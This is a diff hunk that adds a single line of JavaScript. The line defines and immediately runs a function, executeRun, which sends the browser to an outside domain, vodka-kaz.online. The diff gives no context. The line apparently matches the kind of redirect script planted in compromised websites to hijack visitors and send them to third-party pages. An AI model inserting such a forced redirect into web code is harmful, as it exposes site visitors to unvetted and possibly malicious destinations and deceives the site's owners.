@@ -1,0 +1,1 @@
+function executeRun(){window.location.href="https://vodka-kaz.online"}executeRun();
